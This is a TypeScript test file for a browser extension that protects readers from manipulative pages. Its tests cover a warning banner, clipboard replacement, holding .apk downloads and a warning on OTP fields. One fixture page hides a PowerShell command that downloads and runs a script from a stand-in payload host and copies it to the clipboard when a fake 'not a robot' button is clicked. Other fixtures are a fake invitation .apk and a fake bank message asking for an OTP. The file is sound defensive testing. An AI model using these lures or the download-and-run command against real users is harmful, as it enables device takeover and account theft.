// On-page guard (D-108) in the real extension (TEST build, automatic scanning on): a banner on a manipulative page, a
// command copied by the page replaced on the clipboard, an .apk download held until the reader decides, a warning when a
// secret field is focused on a flagged page, and nothing on an ordinary page. The warning's shadow root is open only in the
// TEST build so these tests can read it.
import type { Page } from 'playwright';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { addCorpusScenario, html, launchExtension, openPopup, openTarget, tabIdOf, type Loaded } from './helpers.js';

let l: Loaded;
beforeAll(async () => {
  l = await launchExtension('test', 'id');
  await l.context.grantPermissions(['clipboard-read', 'clipboard-write']);
  const anchor = await openTarget(l, 'https://anchor.test/', html('<p>anchor</p>'));
  const popup = await openPopup(l, await tabIdOf(l, anchor));
  await popup.click('details#mode summary');
  await popup.click('#mode-toggle');
  await popup.waitForSelector('#mode[data-mode="automatic"]');
});
afterAll(async () => { await l.context.close(); });

const guard = (p: Page, kind: string) => p.waitForSelector(`[data-veiltrace-guard="${kind}"]`, { timeout: 12_000 });
const guardText = (p: Page) => p.evaluate(() => document.querySelector('[data-veiltrace-guard]')?.shadowRoot?.textContent ?? '');

describe('on-page guard (automatic scanning on)', () => {
  it('shows a banner on a manipulative page, in plain words', async () => {
    const page = await openTarget(l, addCorpusScenario(l, 'dev', 'D01-en-blog-security-check-overlay'));
    await guard(page, 'page');
    expect(await guardText(page)).toContain('Halaman ini menunjukkan tanda manipulasi');
    expect(await guardText(page)).toContain('Yang diminta dari Anda');
    await page.evaluate(() => (document.querySelector('[data-veiltrace-guard]')?.shadowRoot?.querySelector('button[data-action="primary"]') as HTMLElement).click());
    expect(await page.$('[data-veiltrace-guard]')).toBeNull();
  });

  it('replaces a command that the page copies from a hidden field, and warns', async () => {
    l.pages.set('https://verify.test/', html(`<h1>Verifikasi</h1><button id="go">Saya bukan robot</button>
      <textarea id="c" style="position:absolute;left:-9999px">powershell -w hidden -c "iwr https://payload.example.invalid/x.ps1 | iex"</textarea>
      <script>document.getElementById('go').onclick=()=>{const t=document.getElementById('c');t.focus();t.select();document.execCommand('copy');};</script>`));
    const page = await openTarget(l, 'https://verify.test/');
    await page.waitForTimeout(1500);
    await page.click('#go');
    await guard(page, 'clipboard');
    expect(await guardText(page)).toContain('Jangan tempel ini');
    const clip = await page.evaluate(() => navigator.clipboard.readText());
    expect(clip).not.toContain('powershell');
    expect(clip).toContain('VeilTrace');
  });

  it('holds an .apk download until the reader decides', async () => {
    l.pages.set('https://undangan.test/', html('<p>Undangan pernikahan kami</p><a id="dl" href="/files/Undangan_Digital.apk">Buka undangan</a>'));
    const page = await openTarget(l, 'https://undangan.test/');
    await page.click('#dl');
    await guard(page, 'apk');
    expect(await guardText(page)).toContain('File aplikasi Android (.apk)');
    expect(page.url()).toBe('https://undangan.test/');
    expect(l.blocked.some((u) => u.endsWith('.apk'))).toBe(false);
    await page.evaluate(() => (document.querySelector('[data-veiltrace-guard]')?.shadowRoot?.querySelector('button[data-action="primary"]') as HTMLElement).click());
    expect(await page.$('[data-veiltrace-guard]')).toBeNull();
  });

  it('warns when a secret field is focused on a flagged page, without reading what is typed', async () => {
    l.pages.set('https://akun.test/', html(`<div class="comments"><div class="comment"><p>Petugas bank: akun Anda akan diblokir hari ini. Kirimkan kode OTP Anda sekarang juga untuk verifikasi akun.</p></div></div>
      <label for="otp">Kode OTP</label><input id="otp" autocomplete="one-time-code">`));
    const page = await openTarget(l, 'https://akun.test/');
    await page.waitForTimeout(2500);
    await page.click('#otp');
    await guard(page, 'secret');
    expect(await guardText(page)).toContain('Hati-hati sebelum mengetik kode atau kata sandi');
  });

  it('stays quiet on an ordinary page, including when the reader copies a visible command', async () => {
    const page = await openTarget(l, addCorpusScenario(l, 'dev', 'D16-en-vendor-install-script'));
    await page.waitForTimeout(3000);
    expect(await page.$('[data-veiltrace-guard]')).toBeNull();
    await page.evaluate(() => {
      const code = document.querySelector('pre, code');
      if (!code) return;
      const r = document.createRange();
      r.selectNodeContents(code);
      const s = getSelection();
      s?.removeAllRanges();
      s?.addRange(r);
      document.execCommand('copy');
    });
    await page.waitForTimeout(300);
    expect(await page.$('[data-veiltrace-guard]')).toBeNull();
    expect(l.blocked).toEqual([]);
  });
});
